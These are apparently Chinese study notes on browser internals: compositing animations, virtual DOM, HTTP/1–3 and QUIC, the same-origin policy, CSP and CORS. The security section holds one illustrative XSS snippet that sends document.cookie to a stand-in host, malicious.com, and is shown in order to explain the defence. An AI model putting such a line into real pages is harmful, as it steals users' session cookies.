<h4 id="4-合理利用-CSS-合成动画"><a href="#4-合理利用-CSS-合成动画" class="headerlink" title="4. 合理利用 CSS 合成动画"></a>4. 合理利用 CSS 合成动画</h4><p>合成动画是直接在合成线程上执行的，这和在主线程上执行的布局、绘制等操作不同，如果主线程被 JavaScript 或者一些布局任务占用，CSS 动画依然能继续执行。所以要尽量利用好 CSS 合成动画，如果能让 CSS 处理动画，就尽量交给 CSS 来操作。</p>
<p>另外，如果能提前知道对某个元素执行动画操作，那就最好将其标记为 will-change，这是告诉渲染引擎需要将该元素单独生成一个图层。</p>
<h4 id="5-避免频繁的垃圾回收"><a href="#5-避免频繁的垃圾回收" class="headerlink" title="5. 避免频繁的垃圾回收"></a>5. 避免频繁的垃圾回收</h4><p>如果在一些函数中频繁创建临时对象，那么垃圾回收器也会频繁地去执行垃圾回收策略。这样当垃圾回收操作发生时，就会占用主线程，从而影响到其他任务的执行，严重的话还会让用户产生掉帧、不流畅的感觉。</p>
<p>所以可以尽可能优化储存结构，尽可能避免小颗粒对象的产生。</p>
<h2 id="虚拟DOM：虚拟DOM和实际的DOM有何不同？"><a href="#虚拟DOM：虚拟DOM和实际的DOM有何不同？" class="headerlink" title="虚拟DOM：虚拟DOM和实际的DOM有何不同？"></a>虚拟DOM：虚拟DOM和实际的DOM有何不同？</h2><h3 id="DOM-的缺陷"><a href="#DOM-的缺陷" class="headerlink" title="DOM 的缺陷"></a>DOM 的缺陷</h3><p>重排、重绘、合成。对于 DOM 的不当操作还有可能引发<strong>强制同步布局</strong>和<strong>布局抖动</strong>的问题，这些操作都会大大降低渲染效率。</p>
<h3 id="什么是虚拟-DOM"><a href="#什么是虚拟-DOM" class="headerlink" title="什么是虚拟 DOM"></a>什么是虚拟 DOM</h3><p>解决的事情:</p>
<ul>
<li>将页面改变的内容应用到虚拟 DOM 上，而不是直接应用到 DOM 上。</li>
<li>变化被应用到虚拟 DOM 上时，虚拟 DOM 并不急着去渲染页面，而仅仅是调整虚拟 DOM 的内部状态，这样操作虚拟 DOM 的代价就变得非常轻了。</li>
<li>在虚拟 DOM 收集到足够的改变时，再把这些变化一次性应用到真实的 DOM 上。</li>
</ul>
<p><img src="https://i.loli.net/2021/06/14/ZKzjmVgTqy6tLRp.jpg" alt="Snipaste_2021-06-14_20-16-56.jpg"></p>
<p>DOM 运行过程：</p>
<ul>
<li><strong>创建阶段</strong>。首先依据 JSX 和基础数据创建出来虚拟 DOM，它反映了真实的 DOM 树的结构。然后由虚拟 DOM 树创建出真实 DOM 树，真实的 DOM 树生成完后，再触发渲染流水线往屏幕输出页面。</li>
<li><strong>更新阶段</strong>。如果数据发生了改变，那么就需要根据新的数据创建一个新的虚拟 DOM 树；然后 React 比较两个树，找出变化的地方，并把变化的地方一次性更新到真实的 DOM 树上；最后渲染引擎更新渲染流水线，并生成新的页面。</li>
</ul>
<p><strong>从双缓存和 MVC 模型这两个视角来聊聊虚拟 DOM：</strong></p>
<h4 id="1-双缓存"><a href="#1-双缓存" class="headerlink" title="1. 双缓存"></a>1. 双缓存</h4><p>在开发游戏或者处理其他图像的过程中，屏幕从前缓冲区读取数据然后显示。但是很多图形操作都很复杂且需要大量的运算，比如一幅完整的画面，可能需要计算多次才能完成，如果每次计算完一部分图像，就将其写入缓冲区，那么就会造成一个后果，那就是在显示一个稍微复杂点的图像的过程中，你看到的页面效果可能是一部分一部分地显示出来，因此在刷新页面的过程中，会让用户感受到界面的闪烁。</p>
<p>而使用双缓存，可以让你先将计算的中间结果存放在另一个缓冲区中，等全部的计算结束，该缓冲区已经存储了完整的图形之后，再将该缓冲区的图形数据一次性复制到显示缓冲区，这样就使得整个图像的输出非常稳定。</p>
<p>在这里，你可以把虚拟 DOM 看成是 DOM 的一个 buffer，和图形显示一样，它会在完成一次完整的操作之后，再把结果应用到 DOM 上，这样就能减少一些不必要的更新，同时还能保证 DOM 的稳定输出。</p>
<h4 id="2-MVC-模式"><a href="#2-MVC-模式" class="headerlink" title="2. MVC 模式"></a>2. MVC 模式</h4><p>MVC 的整体结构比较简单，由模型、视图和控制器组成，其<strong>核心思想就是将数据和视图分离</strong>，也就是说视图和模型之间是不允许直接通信的，它们之间的通信都是通过控制器来完成的。通常情况下的通信路径是视图发生了改变，然后通知控制器，控制器再根据情况判断是否需要更新模型数据。</p>
<p>所以在分析基于 React 或者 Vue 这些前端框架时，我们需要先重点把握大的 MVC 骨架结构，然后再重点查看通信方式和控制器的具体实现方式，这样我们就能从架构的视角来理解这些前端框架了。比如在分析 React 项目时，我们可以把 React 的部分看成是一个 MVC 中的视图，在项目中结合 Redux 就可以构建一个 MVC 的模型结构，如下图所示：</p>
<p><img src="https://i.loli.net/2021/06/14/w2rmJGqKsAijtkD.jpg" alt="Snipaste_2021-06-14_20-19-40.jpg"></p>
<p>在该图中，我们可以把虚拟 DOM 看成是 MVC 的视图部分，其控制器和模型都是由 Redux 提供的。其具体实现过程如下：</p>
<ul>
<li>图中的控制器是用来监控 DOM 的变化，一旦 DOM 发生变化，控制器便会通知模型，让其更新数据；</li>
<li>模型数据更新好之后，控制器会通知视图，告诉它模型的数据发生了变化；</li>
<li>视图接收到更新消息之后，会根据模型所提供的数据来生成新的虚拟 DOM；</li>
<li>新的虚拟 DOM 生成好之后，就需要与之前的虚拟 DOM 进行比较，找出变化的节点；</li>
<li>比较出变化的节点之后，React 将变化的虚拟节点应用到 DOM 上，这样就会触发 DOM 节点的更新；</li>
<li>DOM 节点的变化又会触发后续一系列渲染流水线的变化，从而实现页面的更新。</li>
</ul>
<h2 id="渐进式网页应用（PWA）"><a href="#渐进式网页应用（PWA）" class="headerlink" title="渐进式网页应用（PWA）"></a>渐进式网页应用（PWA）</h2><p>PWA，全称是 Progressive Web App，即“渐进式 +Web 应用”。至于“渐进式”，从下面两个方面来理解：</p>
<ul>
<li>站在 Web 应用开发者来说，PWA 提供了一个渐进式的过渡方案，让普通站点逐步过渡到 Web 应用。采取渐进式可以降低站点改造的代价，使得站点逐步支持各项新技术，而不是一步到位。</li>
<li>站在技术角度来说，PWA 技术也是一个渐进式的演化过程，在技术层面会一点点演进，比如逐渐提供更好的设备特性支持，不断优化更加流畅的动画效果，不断让页面的加载速度变得更快，不断实现本地应用的特性。</li>
</ul>
<h1 id="浏览器中的网络"><a href="#浏览器中的网络" class="headerlink" title="浏览器中的网络"></a>浏览器中的网络</h1><h2 id="HTTP-1：HTTP性能优化"><a href="#HTTP-1：HTTP性能优化" class="headerlink" title="HTTP/1：HTTP性能优化"></a>HTTP/1：HTTP性能优化</h2><h3 id="超文本传输协议-HTTP-0-9"><a href="#超文本传输协议-HTTP-0-9" class="headerlink" title="超文本传输协议 HTTP/0.9"></a>超文本传输协议 HTTP/0.9</h3><p>HTTP/0.9 是于 1991 年提出的，主要用于学术交流，需求很简单——用来在网络之间传递 HTML 超文本的内容，所以被称为<strong>超文本传输协议</strong>。</p>
<p>HTTP/0.9 的一个完整的请求流程（可参考下图）。</p>
<ul>
<li>因为 HTTP 都是基于 TCP 协议的，所以客户端先要根据 IP 地址、端口和服务器建立 TCP 连接，而建立连接的过程就是 TCP 协议三次握手的过程。</li>
<li>建立好连接之后，会发送一个 GET 请求行的信息，如<code>GET /index.html</code>用来获取 index.html。</li>
<li>服务器接收请求信息之后，读取对应的 HTML 文件，并将数据以 ASCII 字符流返回给客户端。</li>
<li>HTML 文档传输完成后，断开连接。</li>
</ul>
<p><img src="https://i.loli.net/2021/06/14/D3WYz4wmiP9kc6C.jpg" alt="Snipaste_2021-06-14_20-35-44.jpg"></p>
<p>HTTP/0.9 的实现有以下三个特点：</p>
<ul>
<li>第一个是只有一个请求行，并没有<strong>HTTP 请求头和请求体</strong>，因为只需要一个请求行就可以完整表达客户端的需求了。</li>
<li>第二个是服务器也没有返回头信息，这是因为服务器端并不需要告诉客户端太多信息，只需要返回数据就可以了。</li>
<li>第三个是返回的文件内容是以 ASCII 字符流来传输的，因为都是 HTML 格式的文件，所以使用 ASCII 字节码来传输是最合适的。</li>
</ul>
<h3 id="被浏览器推动的-HTTP-1-0"><a href="#被浏览器推动的-HTTP-1-0" class="headerlink" title="被浏览器推动的 HTTP/1.0"></a>被浏览器推动的 HTTP/1.0</h3><p>在浏览器中展示的不单是 HTML 文件了，还包括了 JavaScript、CSS、图片、音频、视频等不同类型的文件。因此<strong>支持多种类型的文件下载是 HTTP/1.0 的一个核心诉求</strong>，而且文件格式不仅仅局限于 ASCII 编码，还有很多其他类型编码的文件。</p>
<p>为了让客户端和服务器能更深入地交流，HTTP/1.0 引入了请求头和响应头，它们都是以为 Key-Value 形式保存的，在 HTTP 发送请求时，会带上请求头信息，服务器返回数据时，会先返回响应头信息。至于 HTTP/1.0 具体的请求流程，你可以参考下图。</p>
<p><img src="https://i.loli.net/2021/06/14/21fcJbhFNno7Dqv.jpg" alt="Snipaste_2021-06-14_20-37-24.jpg"></p>
<p>HTTP/1.0 通过请求头和响应头来进行协商，在发起请求时候会通过 HTTP 请求头告诉服务器它期待服务器返回什么类型的文件、采取什么形式的压缩、提供什么语言的文件以及文件的具体编码。最终发送出来的请求头内容如下：</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">accept: text/html</span><br><span class="line">accept-encoding: gzip, deflate, br</span><br><span class="line">accept-Charset: ISO-8859-1,utf-8</span><br><span class="line">accept-language: zh-CN,zh</span><br></pre></td></tr></table></figure>

<p>第一行表示期望服务器返回 html 类型的文件，第二行表示期望服务器可以采用 gzip、deflate 或者 br 其中的一种压缩方式，第三行表示期望返回的文件编码是 UTF-8 或者 ISO-8859-1，第四行是表示期望页面的优先语言是中文。</p>
<p>服务器接收到浏览器发送过来的请求头信息之后，会根据请求头的信息来准备响应数据。不过有时候会有一些意外情况发生，比如浏览器请求的压缩类型是 gzip，但是服务器不支持 gzip，只支持 br 压缩，那么它会通过响应头中的 content-encoding 字段告诉浏览器最终的压缩类型，也就是说最终浏览器需要根据响应头的信息来处理数据。下面是一段响应头的数据信息：</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">content-encoding: br</span><br><span class="line">content-type: text/html; charset=UTF-8</span><br></pre></td></tr></table></figure>

<p>第一行表示服务器采用了 br 的压缩方法，第二行表示服务器返回的是 html 文件，并且该文件的编码类型是 UTF-8。</p>
<p>HTTP/1.0 除了对多文件提供良好的支持外，还依据当时实际的需求引入了很多其他的特性，这些特性都是通过请求头和响应头来实现的。下面我们来看看新增的几个典型的特性：</p>
<ul>
<li>有的请求服务器可能无法处理，或者处理出错，这时候就需要告诉浏览器服务器最终处理该请求的情况，这就引入了<strong>状态码</strong>。状态码是通过响应行的方式来通知浏览器的。</li>
<li>为了减轻服务器的压力，在 HTTP/1.0 中提供了<strong>Cache 机制</strong>，用来缓存已经下载过的数据。</li>
<li>服务器需要统计客户端的基础信息，比如 Windows 和 macOS 的用户数量分别是多少，所以 HTTP/1.0 的请求头中还加入了<strong>用户代理</strong>的字段。</li>
</ul>
<h3 id="缝缝补补的-HTTP-1-1"><a href="#缝缝补补的-HTTP-1-1" class="headerlink" title="缝缝补补的 HTTP/1.1"></a>缝缝补补的 HTTP/1.1</h3><h4 id="1-改进持久连接"><a href="#1-改进持久连接" class="headerlink" title="1. 改进持久连接"></a>1. 改进持久连接</h4><p>HTTP/1.0 每进行一次 HTTP 通信，都需要经历建立 TCP 连接、传输 HTTP 数据和断开 TCP 连接三个阶段。为了解决这个问题，<strong>HTTP/1.1 中增加了持久连接的方法，它的特点是在一个 TCP 连接上可以传输多个 HTTP 请求，只要浏览器或者服务器没有明确断开连接，那么该 TCP 连接会一直保持</strong>。</p>
<p>HTTP 的持久连接可以有效减少 TCP 建立连接和断开连接的次数，这样的好处是减少了服务器额外的负担，并提升整体 HTTP 的请求时长。持久连接在 HTTP/1.1 中是默认开启的，如果不想要采用持久连接，可以在 HTTP 请求头中加上<code>Connection: close</code>。目前浏览器中对于同一个域名，默认允许同时建立 6 个 TCP 持久连接。</p>
<h4 id="2-不成熟的-HTTP-管线化"><a href="#2-不成熟的-HTTP-管线化" class="headerlink" title="2. 不成熟的 HTTP 管线化"></a>2. 不成熟的 HTTP 管线化</h4><p>持久连接虽然能减少 TCP 的建立和断开次数，但是它需要等待前面的请求返回之后，才能进行下一次请求。如果 TCP 通道中的某个请求因为某些原因没有及时返回，那么就会阻塞后面的所有请求，这就是著名的<strong>队头阻塞</strong>的问题。</p>
<p>HTTP/1.1 中试图通过管线化的技术来解决<strong>队头阻塞</strong>的问题。HTTP/1.1 中的管线化是指将多个 HTTP 请求整批提交给服务器的技术，虽然可以整批发送请求，不过服务器依然需要根据请求顺序来回复浏览器的请求。</p>
<h4 id="3-提供虚拟主机的支持"><a href="#3-提供虚拟主机的支持" class="headerlink" title="3. 提供虚拟主机的支持"></a>3. 提供虚拟主机的支持</h4><p>在 HTTP/1.0 中，每个域名绑定了一个唯一的 IP 地址，因此一个服务器只能支持一个域名。但是随着虚拟主机技术的发展，需要实现在一台物理主机上绑定多个虚拟主机，每个虚拟主机都有自己的单独的域名，这些单独的域名都公用同一个 IP 地址。</p>
<p>因此，HTTP/1.1 的请求头中增加了<strong>Host 字段</strong>，用来表示当前的域名地址，这样服务器就可以根据不同的 Host 值做不同的处理。</p>
<h4 id="4-对动态生成的内容提供了完美支持"><a href="#4-对动态生成的内容提供了完美支持" class="headerlink" title="4. 对动态生成的内容提供了完美支持"></a>4. 对动态生成的内容提供了完美支持</h4><p>在设计 HTTP/1.0 时，需要在响应头中设置完整的数据大小，如<code>Content-Length: 901</code>，这样浏览器就可以根据设置的数据大小来接收数据。不过随着服务器端的技术发展，很多页面的内容都是动态生成的，因此在传输数据之前并不知道最终的数据大小，这就导致了浏览器不知道何时会接收完所有的文件数据。</p>
<p>HTTP/1.1 通过引入<strong>Chunk transfer 机制</strong>来解决这个问题，服务器会将数据分割成若干个任意大小的数据块，每个数据块发送时会附上上个数据块的长度，最后使用一个零长度的块作为发送数据完成的标志。这样就提供了对动态内容的支持。</p>
<h4 id="5-客户端-Cookie、安全机制"><a href="#5-客户端-Cookie、安全机制" class="headerlink" title="5. 客户端 Cookie、安全机制"></a>5. 客户端 Cookie、安全机制</h4><h2 id="HTTP-2：如何提升网络速度？"><a href="#HTTP-2：如何提升网络速度？" class="headerlink" title="HTTP/2：如何提升网络速度？"></a>HTTP/2：如何提升网络速度？</h2><h3 id="HTTP-1-1-的主要问题"><a href="#HTTP-1-1-的主要问题" class="headerlink" title="HTTP/1.1 的主要问题"></a>HTTP/1.1 的主要问题</h3><p> HTTP/1.1<strong>对带宽的利用率却并不理想</strong>，这也是 HTTP/1.1 的一个核心问题。<strong>带宽是指每秒最大能发送或者接收的字节数</strong>。我们把每秒能发送的最大字节数称为<strong>上行带宽</strong>，每秒能够接收的最大字节数称为<strong>下行带宽</strong>。</p>
<p>HTTP/1.1 很难将带宽用满。比如我们常说的 100M 带宽，实际的下载速度能达到 12.5M/S，而采用 HTTP/1.1 时，也许在加载页面资源时最大只能使用到 2.5M/S，很难将 12.5M 全部用满。</p>
<p>之所以会出现这个问题，主要是由以下三个原因导致的。</p>
<p><strong>第一个原因，TCP 的慢启动。</strong>之所以说慢启动会带来性能问题，是因为页面中常用的一些关键资源文件本来就不大，如 HTML 文件、CSS 文件和 JavaScript 文件，通常这些文件在 TCP 连接建立好之后就要发起请求的，但这个过程是慢启动，所以耗费的时间比正常的时间要多很多，这样就推迟了宝贵的首次渲染页面的时长了。</p>
<p><strong>第二个原因，同时开启了多条 TCP 连接，那么这些连接会竞争固定的带宽。</strong>系统同时建立了多条 TCP 连接，当带宽充足时，每条连接发送或者接收速度会慢慢向上增加；而一旦带宽不足时，这些 TCP 连接又会减慢发送或者接收的速度。比如一个页面有 200 个文件，使用了 3 个 CDN，那么加载该网页的时候就需要建立 6 * 3，也就是 18 个 TCP 连接来下载资源；在下载过程中，当发现带宽不足的时候，各个 TCP 连接就需要动态减慢接收数据的速度。</p>
<p>有的 TCP 连接下载的是一些关键资源，如 CSS 文件、JavaScript 文件等，而有的 TCP 连接下载的是图片、视频等普通的资源文件，但是多条 TCP 连接之间又不能协商让哪些关键资源优先下载，这样就有可能影响那些关键资源的下载速度了。</p>
<p><strong>第三个原因，HTTP/1.1 队头阻塞的问题。</strong>在 HTTP/1.1 中使用持久连接时，虽然能公用一个 TCP 管道，但是在一个管道中同一时刻只能处理一个请求，在当前的请求没有结束之前，其他的请求只能处于阻塞状态。这意味着我们不能随意在一个管道中发送请求和接收内容。</p>
<p>在浏览器处理生成页面的过程中，是非常希望能提前接收到数据的，这样就可以对这些数据做预处理操作，比如提前接收到了图片，那么就可以提前进行编解码操作，等到需要使用该图片的时候，就可以直接给出处理后的数据了，这样能让用户感受到整体速度的提升。</p>
<h3 id="HTTP-2-的多路复用"><a href="#HTTP-2-的多路复用" class="headerlink" title="HTTP/2 的多路复用"></a>HTTP/2 的多路复用</h3><p>HTTP/2 的思路就是<strong>一个域名只使用一个 TCP 长连接 <strong>来传输数据，这样整个页面资源的下载过程只需要一次慢启动，同时也避免了多个 TCP 连接竞争带宽所带来的问题；</strong>消除队头阻塞问题</strong>。</p>
<p><img src="https://i.loli.net/2021/06/15/KUeDB5NsnkvWSz3.jpg" alt="Snipaste_2021-06-15_14-49-41.jpg"></p>
<p>该图就是 HTTP/2 最核心、最重要且最具颠覆性的<strong>多路复用机制</strong>。从图中你会发现每个请求都有一个对应的 ID，如 stream1 表示 index.html 的请求，stream2 表示 foo.css 的请求。这样在浏览器端，就可以随时将请求发送给服务器了。</p>
<p>服务器端接收到这些请求后，会根据自己的喜好来决定优先返回哪些内容，比如服务器可能早就缓存好了 index.html 和 bar.js 的响应头信息，那么当接收到请求的时候就可以立即把 index.html 和 bar.js 的响应头信息返回给浏览器，然后再将 index.html 和 bar.js 的响应体数据返回给浏览器。之所以可以随意发送，是因为每份数据都有对应的 ID，浏览器接收到之后，会筛选出相同 ID 的内容，将其拼接为完整的 HTTP 响应数据。</p>
<p>HTTP/2 使用了多路复用技术，可以将请求分成一帧一帧的数据去传输，这样带来了一个额外的好处，就是当收到一个优先级高的请求时，比如接收到 JavaScript 或者 CSS 关键资源的请求，服务器可以暂停之前的请求来优先处理关键资源的请求。</p>
<h3 id="多路复用的实现"><a href="#多路复用的实现" class="headerlink" title="多路复用的实现"></a>多路复用的实现</h3><p><img src="https://i.loli.net/2021/06/15/xhyXOAmt2lvpa3J.jpg" alt="Snipaste_2021-06-15_14-52-11.jpg"></p>
<p> HTTP/2 的请求和接收过程：</p>
<ul>
<li>首先，浏览器准备好请求数据，包括了请求行、请求头等信息，如果是 POST 方法，那么还要有请求体。</li>
<li>这些数据经过二进制分帧层处理之后，会被转换为一个个带有请求 ID 编号的帧，通过协议栈将这些帧发送给服务器。</li>
<li>服务器接收到所有帧之后，会将所有相同 ID 的帧合并为一条完整的请求信息。</li>
<li>然后服务器处理该条请求，并将处理的响应行、响应头和响应体分别发送至二进制分帧层。</li>
<li>同样，二进制分帧层会将这些响应数据转换为一个个带有请求 ID 编号的帧，经过协议栈发送给浏览器。</li>
<li>浏览器接收到响应帧之后，会根据 ID 编号将帧的数据提交给对应的请求。</li>
</ul>
<p>从上面的流程可以看出，<strong>通过引入二进制分帧层，就实现了 HTTP 的多路复用技术</strong>。</p>
<h3 id="HTTP-2-其他特性"><a href="#HTTP-2-其他特性" class="headerlink" title="HTTP/2 其他特性"></a>HTTP/2 其他特性</h3><h4 id="1-可以设置请求的优先级"><a href="#1-可以设置请求的优先级" class="headerlink" title="1. 可以设置请求的优先级"></a>1. 可以设置请求的优先级</h4><p>HTTP/2 提供了请求优先级，可以在发送请求时，标上该请求的优先级，这样服务器接收到请求之后，会优先处理优先级高的请求。</p>
<h4 id="2-服务器推送"><a href="#2-服务器推送" class="headerlink" title="2. 服务器推送"></a>2. 服务器推送</h4><p>除了设置请求的优先级外，HTTP/2 还可以直接将数据提前推送到浏览器。你可以想象这样一个场景，当用户请求一个 HTML 页面之后，服务器知道该 HTML 页面会引用几个重要的 JavaScript 文件和 CSS 文件，那么在接收到 HTML 请求之后，附带将要使用的 CSS 文件和 JavaScript 文件一并发送给浏览器，这样当浏览器解析完 HTML 文件之后，就能直接拿到需要的 CSS 文件和 JavaScript 文件，这对首次打开页面的速度起到了至关重要的作用。</p>
<h4 id="3-头部压缩"><a href="#3-头部压缩" class="headerlink" title="3. 头部压缩"></a>3. 头部压缩</h4><p>HTTP/2 对请求头和响应头进行了压缩。</p>
<h2 id="HTTP-3：甩掉TCP、TLS-的包袱，构建高效网络"><a href="#HTTP-3：甩掉TCP、TLS-的包袱，构建高效网络" class="headerlink" title="HTTP/3：甩掉TCP、TLS 的包袱，构建高效网络"></a>HTTP/3：甩掉TCP、TLS 的包袱，构建高效网络</h2><h3 id="HTTP-2-缺陷——TCP-的队头阻塞"><a href="#HTTP-2-缺陷——TCP-的队头阻塞" class="headerlink" title="HTTP/2 缺陷——TCP 的队头阻塞"></a>HTTP/2 缺陷——TCP 的队头阻塞</h3><p>虽然 HTTP/2 解决了应用层面的队头阻塞问题，不过和 HTTP/1.1 一样，HTTP/2 依然是基于 TCP 协议的，而 TCP 最初就是为了单连接而设计的。如果在数据传输的过程中，有一个数据因为网络故障或者其他原因而丢包了，那么整个 TCP 的连接就会处于暂停状态，需要等待丢失的数据包被重新传输过来。参考下图：</p>
<p><img src="https://i.loli.net/2021/06/15/uJN8lmU9PgQpakG.jpg" alt="Snipaste_2021-06-15_15-03-12.jpg"></p>
<p>正常情况下 HTTP/2 是怎么传输多路请求的，为了直观理解，可以参考下图：</p>
<p><img src="https://i.loli.net/2021/06/15/gOT2wPQjRy6EYSD.jpg" alt="Snipaste_2021-06-15_15-04-49.jpg"></p>
<p>在 HTTP/2 中，多个请求是跑在一个 TCP 管道中的，如果其中任意一路数据流中出现了丢包的情况，那么就会阻塞该 TCP 连接中的所有请求。这不同于 HTTP/1.1，使用 HTTP/1.1 时，浏览器为每个域名开启了 6 个 TCP 连接，如果其中的 1 个 TCP 连接发生了队头阻塞，那么其他的 5 个连接依然可以继续传输数据。</p>
<p>所以随着丢包率的增加，HTTP/2 的传输效率也会越来越差。有测试数据表明，当系统达到了 2% 的丢包率时，HTTP/1.1 的传输效率反而比 HTTP/2 表现得更好。</p>
<h3 id="TCP-建立连接的延时"><a href="#TCP-建立连接的延时" class="headerlink" title="TCP 建立连接的延时"></a>TCP 建立连接的延时</h3><p>TCP 的握手过程也是影响传输效率的一个重要因素。HTTP/1 和 HTTP/2 都是使用 TCP 协议来传输的，而如果使用 HTTPS 的话，还需要使用 TLS 协议进行安全传输，而使用 TLS 也需要一个握手过程，这样就需要有两个握手延迟过程。</p>
<ol>
<li>在建立 TCP 连接的时候，需要和服务器进行三次握手来确认连接成功，也就是说需要在消耗完 1.5 个 RTT 之后才能进行数据传输。</li>
<li>进行 TLS 连接，TLS 有两个版本——TLS1.2 和 TLS1.3，每个版本建立连接所花的时间不同，大致是需要 1～2 个 RTT。</li>
</ol>
<h3 id="TCP-协议僵化"><a href="#TCP-协议僵化" class="headerlink" title="TCP 协议僵化"></a>TCP 协议僵化</h3><p>第一个是<strong>中间设备的僵化</strong>。这些中间设备有很多种类型，并且每种设备都有自己的目的，这些设备包括了路由器、防火墙、NAT、交换机等。它们通常依赖一些很少升级的软件，这些软件使用了大量的 TCP 特性，这些功能被设置之后就很少更新了。所以，如果我们在客户端升级了 TCP 协议，但是当新协议的数据包经过这些中间设备时，它们可能不理解包的内容，于是这些数据就会被丢弃掉。这就是中间设备僵化，它是阻碍 TCP 更新的一大障碍。</p>
<p><strong>操作系统也是导致 TCP 协议僵化的另外一个原因</strong>。因为 TCP 协议都是通过操作系统内核来实现的，应用程序只能使用不能修改。通常操作系统的更新都滞后于软件的更新，因此要想自由地更新内核中的 TCP 协议也是非常困难的。</p>
<h3 id="QUIC-协议"><a href="#QUIC-协议" class="headerlink" title="QUIC 协议"></a>QUIC 协议</h3><p>HTTP/3 选择基于 UDP 实现类似于 TCP 的多路数据流、传输可靠性等功能，我们把这套功能称为<strong>QUIC 协议</strong>。关于 HTTP/2 和 HTTP/3 协议栈的比较，可以参考下图：</p>
<p><img src="https://i.loli.net/2021/06/15/2K3kybagoAHzrFI.jpg" alt="Snipaste_2021-06-15_15-10-44.jpg"></p>
<p>HTTP/3 中的 QUIC 协议集合了以下几点功能。</p>
<ul>
<li><p><strong>实现了类似 TCP 的流量控制、传输可靠性的功能</strong>。虽然 UDP 不提供可靠性的传输，但 QUIC 在 UDP 的基础之上增加了一层来保证数据可靠性传输。它提供了数据包重传、拥塞控制以及其他一些 TCP 中存在的特性。</p>
</li>
<li><p><strong>集成了 TLS 加密功能</strong>。目前 QUIC 使用的是 TLS1.3，相较于早期版本 TLS1.3 有更多的优点，其中最重要的一点是减少了握手所花费的 RTT 个数。</p>
</li>
<li><p><strong>实现了 HTTP/2 中的多路复用功能</strong>。和 TCP 不同，QUIC 实现了在同一物理连接上可以有多个独立的逻辑数据流（如下图）。实现了数据流的单独传输，就解决了 TCP 中队头阻塞的问题。<img src="https://i.loli.net/2021/06/15/eHhQVw29qI1YyzO.jpg" alt="Snipaste_2021-06-15_15-11-45.jpg"></p>
</li>
<li><p><strong>实现了快速握手功能</strong>。由于 QUIC 是基于 UDP 的，所以 QUIC 可以实现使用 0-RTT 或者 1-RTT 来建立连接，这意味着 QUIC 可以用最快的速度来发送和接收数据，这样可以大大提升首次打开页面的速度。</p>
</li>
</ul>
<h3 id="HTTP-3-的挑战"><a href="#HTTP-3-的挑战" class="headerlink" title="HTTP/3 的挑战"></a>HTTP/3 的挑战</h3><p>第一，从目前的情况来看，服务器和浏览器端都没有对 HTTP/3 提供比较完整的支持。</p>
<p>第二，部署 HTTP/3 也存在着非常大的问题。因为系统内核对 UDP 的优化远远没有达到 TCP 的优化程度，这也是阻碍 QUIC 的一个重要原因。</p>
<p>第三，中间设备僵化的问题。这些设备对 UDP 的优化程度远远低于 TCP，据统计使用 QUIC 协议时，大约有 3%～7% 的丢包率。</p>
<hr>
<h1 id="浏览器安全"><a href="#浏览器安全" class="headerlink" title="浏览器安全"></a>浏览器安全</h1><h2 id="同源策略：为什么XMLHttpRequest不能跨域请求资源？"><a href="#同源策略：为什么XMLHttpRequest不能跨域请求资源？" class="headerlink" title="同源策略：为什么XMLHttpRequest不能跨域请求资源？"></a>同源策略：为什么XMLHttpRequest不能跨域请求资源？</h2><p>页面中最基础、最核心的安全策略：<strong>同源策略</strong></p>
<h3 id="什么是同源策略"><a href="#什么是同源策略" class="headerlink" title="什么是同源策略"></a>什么是同源策略</h3><p>如果两个 URL 的协议、域名和端口都相同，我们就称这两个 URL 同源。浏览器默认两个相同的源之间是可以相互访问资源和操作 DOM 的。两个不同的源之间若想要相互访问资源或者操作 DOM，那么会有一套基础的安全策略的制约，我们把这称为<strong>同源策略</strong>。</p>
<p>具体来讲，同源策略主要表现在 DOM、Web 数据和网络这三个层面。</p>
<p><strong>第一个，DOM 层面</strong>。同源策略限制了来自不同源的 JavaScript 脚本对当前 DOM 对象读和写的操作。</p>
<p><strong>第二个，数据层面</strong>。同源策略限制了不同源的站点读取当前站点的 Cookie、IndexDB、LocalStorage 等数据。</p>
<p><strong>第三个，网络层面</strong>。同源策略限制了通过 XMLHttpRequest 等方式将站点的数据发送给不同源的站点。</p>
<h3 id="安全和便利性的权衡"><a href="#安全和便利性的权衡" class="headerlink" title="安全和便利性的权衡"></a>安全和便利性的权衡</h3><h4 id="1-页面中可以嵌入第三方资源"><a href="#1-页面中可以嵌入第三方资源" class="headerlink" title="1. 页面中可以嵌入第三方资源"></a>1. 页面中可以嵌入第三方资源</h4><figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">onClick</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">  <span class="keyword">let</span> url = <span class="string">`http://malicious.com?cookie = <span class="subst">$&#123;<span class="built_in">document</span>.cookie&#125;</span>`</span></span><br><span class="line">  open(url)</span><br><span class="line">&#125;</span><br><span class="line">onClick()</span><br></pre></td></tr></table></figure>

<p>在这段代码中，恶意脚本读取 Cookie 数据，并将其作为参数添加至恶意站点尾部，当打开该恶意页面时，恶意服务器就能接收到当前用户的 Cookie 信息。</p>
<p>以上就是一个非常典型的 XSS 攻击。为了解决 XSS 攻击，浏览器中引入了内容安全策略，称为 CSP。<strong>CSP 的核心思想是让服务器决定浏览器能够加载哪些资源，让服务器决定浏览器是否能够执行内联 JavaScript 代码</strong>。通过这些手段就可以大大减少 XSS 攻击。</p>
<h4 id="2-跨域资源共享和跨文档消息机制"><a href="#2-跨域资源共享和跨文档消息机制" class="headerlink" title="2. 跨域资源共享和跨文档消息机制"></a>2. 跨域资源共享和跨文档消息机制</h4><p>默认情况下，如果打开极客邦的官网页面，在官网页面中通过 XMLHttpRequest 或者 Fetch 来请求 InfoQ 中的资源，这时同源策略会阻止其向 InfoQ 发出请求，这样会大大制约我们的生产力。</p>
<p>为了解决这个问题，我们引入了<strong>跨域资源共享（CORS）</strong>，使用该机制可以进行跨域访问控制，从而使跨域数据传输得以安全进行。</p>
<p>在介绍同源策略时，我们说明了如果两个页面不是同源的，则无法相互操纵 DOM。不过在实际应用中，经常需要两个不同源的 DOM 之间进行通信，于是浏览器中又引入了<strong>跨文档消息机制</strong>，可以通过 window.postMessage 的 JavaScript 接口来和不同源的 DOM 进行通信。</p>
